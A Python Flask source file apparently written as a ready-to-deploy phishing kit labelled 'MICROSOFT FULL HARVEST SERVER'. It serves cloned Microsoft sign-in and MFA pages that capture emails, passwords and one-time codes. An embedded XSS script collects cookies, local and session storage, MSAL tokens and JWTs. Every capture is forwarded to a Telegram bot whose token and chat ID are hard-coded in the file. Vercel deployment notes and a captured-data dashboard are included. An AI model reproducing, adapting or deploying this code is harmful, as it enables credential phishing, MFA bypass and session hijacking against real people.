import os
import secrets
import base64
import json
import requests
import re
from datetime import datetime
from flask import Flask, request, Response, redirect, render_template_string, session, make_response

# ============================================================
# TELEGRAM CONFIG - PASTE YOUR CREDENTIALS HERE
# ============================================================
TELEGRAM_BOT_TOKEN = "8375429354:AAGR5ipSQJvLVt7MTogJxudoNgakjx47EG8"
TELEGRAM_CHAT_ID = "8880713636"
# ============================================================

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)

captured_data = []


def send_tg(msg):
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        requests.post(url, json={
            "chat_id": TELEGRAM_CHAT_ID,
            "text": msg[:4000],
            "parse_mode": "HTML",
            "disable_web_page_preview": True
        }, timeout=10)
        return True
    except:
        return False


def send_tg_file(content, filename):
    if TELEGRAM_BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        return False
    try:
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        requests.post(url, files={"document": (filename, content.encode(), "text/plain")},
                     data={"chat_id": TELEGRAM_CHAT_ID}, timeout=15)
        return True
    except:
        return False


def capture(data):
    data['_time'] = datetime.now().isoformat()
    data['_ip'] = request.remote_addr
    data['_ua'] = request.headers.get('User-Agent', '')
    captured_data.append(data)

    msg = f"<b>🔥 FULL CAPTURE 🔥</b>\n"
    msg += f"⏰ {data['_time']}\n"
    msg += f"🌐 IP: {data['_ip']}\n\n"

    if data.get('email'):
        msg += f"<b>📧 Email:</b> {data['email']}\n"
    if data.get('password'):
        msg += f"<b>🔑 Password:</b> {data['password']}\n"
    if data.get('mfa'):
        msg += f"<b>🔐 MFA:</b> {data['mfa']}\n"

    cookies = data.get('all_cookies', '')
    if cookies:
        msg += f"\n<b>🍪 COOKIES:</b>\n<code>{cookies[:400]}</code>\n"

    ms_cookies = data.get('ms_cookies', {})
    if ms_cookies and isinstance(ms_cookies, dict) and ms_cookies:
        msg += f"\n<b>🔑 MS COOKIES:</b>\n"
        for k, v in ms_cookies.items():
            msg += f"<code>{k}={v[:80]}</code>\n"

    jwt = data.get('jwt_tokens', [])
    if jwt and len(jwt) > 0:
        msg += f"\n<b>🔐 JWT ({len(jwt)}):</b>\n"
        for t in jwt[:3]:
            msg += f"<code>{t[:100]}...</code>\n"
        if len(jwt) > 3:
            msg += f"... +{len(jwt)-3} more\n"

    msal = data.get('msal_tokens', {})
    if msal and isinstance(msal, dict) and msal:
        msg += f"\n<b>📋 MSAL:</b>\n"
        for k, v in msal.items():
            msg += f"<code>{k}={str(v)[:100]}</code>\n"

    ls = data.get('localStorage', {})
    if ls and isinstance(ls, dict) and ls:
        items = list(ls.items())
        msg += f"\n<b>💾 localStorage ({len(items)}):</b>\n"
        for k, v in items[:5]:
            msg += f"<code>{k}={str(v)[:80]}</code>\n"
        if len(items) > 5:
            msg += f"... +{len(items)-5} more\n"

    if data.get('url'):
        msg += f"\n<b>🔗 URL:</b> {data['url'][:200]}\n"

    send_tg(msg)

    # Send files for large data
    if cookies and len(cookies) > 400:
        send_tg_file(cookies, f"cookies_{int(datetime.now().timestamp())}.txt")
    if jwt and len(jwt) > 3:
        send_tg_file('\n'.join(jwt), f"jwt_{int(datetime.now().timestamp())}.txt")
    if ls and isinstance(ls, dict) and len(ls) > 5:
        send_tg_file(json.dumps(ls, indent=2), f"ls_{int(datetime.now().timestamp())}.json")

    print(f"[+] CAPTURED: {json.dumps(data, indent=2)}")


# ============================================================
# XSS STEALER PAYLOAD
# ============================================================

STEALER = r"""
<script>
(function(){
    try{
        var d={
            'cookies':document.cookie,
            'localStorage':{},
            'sessionStorage':{},
            'url':window.location.href,
            'referrer':document.referrer||'',
            'userAgent':navigator.userAgent,
            'msal_tokens':{},
            'ms_cookies':{},
            'jwt_tokens':[]
        };
        for(var i=0;i<localStorage.length;i++){
            var k=localStorage.key(i);
            d.localStorage[k]=localStorage.getItem(k);
        }
        for(var i=0;i<sessionStorage.length;i++){
            var k=sessionStorage.key(i);
            d.sessionStorage[k]=sessionStorage.getItem(k);
        }
        var msKeys=['msal','adal','microsoft','oauth','token','refresh','access','idtoken','login'];
        for(var k in d.localStorage){
            for(var j=0;j<msKeys.length;j++){
                if(k.toLowerCase().indexOf(msKeys[j])!==-1)d.msal_tokens[k]=d.localStorage[k];
            }
        }
        var cp=document.cookie.split(';');
        var mn=['ESTSAUTH','SignInStateCookie','fpc','x-ms','MSAL','AspNetCore','ASP.NET','auth','session','token'];
        for(var i=0;i<cp.length;i++){
            var p=cp[i].trim().split('=');
            var n=p[0];
            for(var j=0;j<mn.length;j++){if(n.toLowerCase().indexOf(mn[j].toLowerCase())!==-1)d.ms_cookies[n]=p.slice(1).join('=');}
        }
        var body=document.documentElement.outerHTML;
        var jr=RegExp('[a-zA-Z0-9_\\-]{20,}\\.[a-zA-Z0-9_\\-]{20,}\\.[a-zA-Z0-9_\\-]{20,}','g');
        var f=body.match(jr);if(f)d.jwt_tokens=f;
        var e=btoa(JSON.stringify(d));
        new Image().src='/c?d='+encodeURIComponent(e);
        fetch('/c',{method:'POST',body:JSON.stringify(d),headers:{'Content-Type':'application/json'}}).catch(function(){});
        if(navigator.sendBeacon)navigator.sendBeacon('/c',JSON.stringify(d));
    }catch(e){}
})();
</script>
"""

# ============================================================
# PAGES
# ============================================================

LOGIN_PAGE = r"""
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Sign in to your Microsoft account</title>
    <style>
        *{margin:0;padding:0;box-sizing:border-box;}
        body{font-family:'Segoe UI',sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh;}
        .card{background:#fff;padding:44px;width:440px;border-radius:2px;box-shadow:0 2px 6px rgba(0,0,0,.2);}
        .logo svg{width:108px;height:24px;margin-bottom:24px;}
        h1{font-size:1.5rem;font-weight:600;margin-bottom:12px;}
        label{display:block;font-size:.875rem;margin-bottom:4px;}
        input[type=email],input[type=password]{width:100%;padding:6px 10px;border:1px solid #8c8c8c;border-radius:2px;font-size:.9375rem;height:36px;margin-bottom:16px;outline:none;}
        input:focus{border-color:#0067b8;box-shadow:0 0 0 2px rgba(0,103,184,.3);}
        .btn{padding:6px 24px;background:#0067b8;color:#fff;border:none;border-radius:2px;font-size:.9375rem;cursor:pointer;float:right;min-width:108px;height:32px;}
        .btn:hover{background:#005da6;}
        .checkbox-row{display:flex;align-items:center;margin-bottom:20px;}
        .checkbox-row input{margin-right:8px;}
        .links{margin-top:24px;font-size:.8125rem;}
        .links a{color:#0067b8;text-decoration:none;display:block;margin-bottom:8px;}
        .links a:hover{text-decoration:underline;}
        .clearfix::after{content:"";clear:both;display:table;}
    </style>
</head>
<body>
    <div class="card">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
                <path fill="#f25022" d="M0 0h11v11H0z"/><path fill="#7fba00" d="M13 0h11v11H13z"/>
                <path fill="#00a4ef" d="M0 13h11v11H0z"/><path fill="#ffb900" d="M13 13h11v11H13z"/>
            </svg>
        </div>
        {% if step == 'email' %}
        <form method=POST action=/l>
            <h1>Sign in</h1>
            <label>Email, phone, or Skype</label>
            <input type=email name=email placeholder="someone@example.com" autofocus required>
            <div class=clearfix><button type=submit class=btn>Next</button></div>
            <div class=links><a href=#>No account? Create one!</a></div>
        </form>
        {% elif step == 'password' %}
        <form method=POST action=/l>
            <h1>Enter password</h1>
            <input type=hidden name=email value="{{ email }}">
            <label>{{ email }}</label>
            <input type=password name=password autofocus required>
            <div class=checkbox-row><input type=checkbox id=kmsi name=kmsi><label for=kmsi>Keep me signed in</label></div>
            <div class=clearfix><button type=submit class=btn>Sign in</button></div>
            <div class=links><a href=#>Forgot password?</a></div>
        </form>
        {% endif %}
    </div>
</body>
</html>
"""

MFA_PAGE = r"""
<!DOCTYPE html>
<html>
<head><title>Approve sign-in</title>
<style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body{font-family:'Segoe UI',sans-serif;background:#f0f0f0;display:flex;justify-content:center;align-items:center;min-height:100vh;}
    .card{background:#fff;padding:44px;width:440px;border-radius:2px;box-shadow:0 2px 6px rgba(0,0,0,.2);text-align:center;}
    h2{margin-bottom:20px;font-weight:600;}
    p{margin-bottom:24px;color:#555;}
    input{width:200px;padding:10px;font-size:1.5rem;letter-spacing:8px;text-align:center;border:1px solid #8c8c8c;border-radius:2px;margin-bottom:20px;}
    .btn{padding:6px 24px;background:#0067b8;color:#fff;border:none;border-radius:2px;font-size:.9375rem;cursor:pointer;height:32px;}
</style></head>
<body>
    <div class=card>
        <h2>Approve sign-in</h2>
        <p>Enter the code from your authenticator app.</p>
        <form method=POST action=/m>
            <input type=hidden name=email value="{{ email }}">
            <input type=text name=mfa placeholder="######" maxlength=6 autofocus required><br><br>
            <button type=submit class=btn>Verify</button>
        </form>
    </div>
</body>
</html>
"""


# ============================================================
# ROUTES - SHORT PATHS FOR RELIABILITY
# ============================================================

@app.route('/')
def home():
    step = session.get('step', 'email')
    email = session.get('email', '')
    resp = make_response(render_template_string(LOGIN_PAGE, step=step, email=email))
    resp.set_cookie('ESTSAUTH', secrets.token_hex(64), httponly=False, samesite='Lax')
    resp.set_cookie('fpc', secrets.token_hex(48), httponly=False)
    resp.set_cookie('x-ms-token', secrets.token_hex(32), httponly=False)
    return resp


@app.route('/l', methods=['POST'])
def login():
    email = request.form.get('email', session.get('email', ''))
    password = request.form.get('password', '')
    kmsi = request.form.get('kmsi', 'off')

    if password:
        cookie_str = request.headers.get('Cookie', '')
        ms_cookies = {}
        for part in cookie_str.split(';'):
            part = part.strip()
            if '=' in part:
                n, v = part.split('=', 1)
                for mn in ['ESTSAUTH', 'fpc', 'x-ms', 'MSAL', 'session', 'auth', 'token']:
                    if mn.lower() in n.lower():
                        ms_cookies[n] = v
                        break
        
        capture({
            'type': 'creds+context',
            'email': email,
            'password': password,
            'kmsi': kmsi,
            'all_cookies': cookie_str,
            'ms_cookies': ms_cookies
        })
        
        session['email'] = email
        session['step'] = 'mfa'
        return render_template_string(MFA_PAGE, email=email)
    else:
        session['email'] = email
        session['step'] = 'password'
        return render_template_string(LOGIN_PAGE, step='password', email=email)


@app.route('/m', methods=['POST'])
def mfa():
    email = request.form.get('email', session.get('email', ''))
    mfa_code = request.form.get('mfa', '')
    
    cookie_str = request.headers.get('Cookie', '')
    ms_cookies = {}
    for part in cookie_str.split(';'):
        part = part.strip()
        if '=' in part:
            n, v = part.split('=', 1)
            for mn in ['ESTSAUTH', 'fpc', 'x-ms', 'MSAL', 'session']:
                if mn.lower() in n.lower():
                    ms_cookies[n] = v
                    break

    capture({
        'type': 'mfa',
        'email': email,
        'mfa': mfa_code,
        'all_cookies': cookie_str,
        'ms_cookies': ms_cookies
    })
    
    return redirect('https://login.microsoftonline.com/')


@app.route('/c', methods=['GET', 'POST'])
def capt():
    """Receive XSS-exfiltrated data."""
    if request.method == 'POST':
        data = request.get_json(silent=True) or {}
    else:
        raw = request.args.get('d', '')
        try:
            data = json.loads(base64.b64decode(raw).decode())
        except:
            data = {'raw': raw}
    
    data['_server_time'] = datetime.now().isoformat()
    data['_server_ip'] = request.remote_addr
    
    # Add cookies from request if not already present
    if not data.get('cookies'):
        data['cookies'] = request.headers.get('Cookie', '')
    
    capture(data)
    
    # Return 1x1 pixel
    pixel = base64.b64decode('R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7')
    return Response(pixel, mimetype='image/gif')


@app.route('/x')
def xss_page():
    """Page with XSS stealer embedded."""
    resp = make_response(f"""
    <!DOCTYPE html>
    <html>
    <head><title>Redirecting...</title></head>
    <body>
        <p>Please wait...</p>
        {STEALER}
    </body>
    </html>
    """)
    resp.set_cookie('ESTSAUTH', secrets.token_hex(64), httponly=False)
    resp.set_cookie('fpc', secrets.token_hex(48), httponly=False)
    resp.set_cookie('session_id', secrets.token_hex(32), httponly=False)
    return resp


@app.route('/d')
def dashboard():
    html = "<h1>Captured Data</h1>"
    html += f"<p>Count: {len(captured_data)}</p>"
    html += "<p>All sent to Telegram in real-time.</p><hr>"
    for i, d in enumerate(reversed(captured_data), 1):
        html += f"<h3>#{i} {d.get('type','?')}</h3>"
        html += f"<pre style='background:#f4f4f4;padding:10px;max-height:300px;overflow:auto'>{json.dumps(d, indent=2)}</pre><hr>"
    return Response(html, mimetype='text/html')


@app.route('/t')
def tg_test():
    ok = send_tg("✅ <b>Server Online!</b>\nFull harvest ready: cookies, JWT, MSAL, localStorage, creds.")
    return "✅ Telegram OK" if ok else "❌ Telegram FAILED"


# ============================================================
# THIS IS THE KEY LINE FOR VERCEL
# The Flask app MUST be named 'app' at module level
# ============================================================

# 'app' is already defined above as Flask(__name__)

# For local testing - this block is IGNORED by Vercel
if __name__ == '__main__':
    print("=" * 60)
    print("  MICROSOFT FULL HARVEST SERVER")
    print("=" * 60)
    status = 'OK' if TELEGRAM_BOT_TOKEN != 'YOUR_BOT_TOKEN_HERE' else 'NOT SET'
    print(f"  Telegram: {status}")
    print(f"  http://localhost:5000")
    print(f"  Test TG: /t")
    print(f"  Dashboard: /d")
    print(f"  XSS: /x")
    print("=" * 60)
    app.run(host='0.0.0.0', port=5000, debug=True)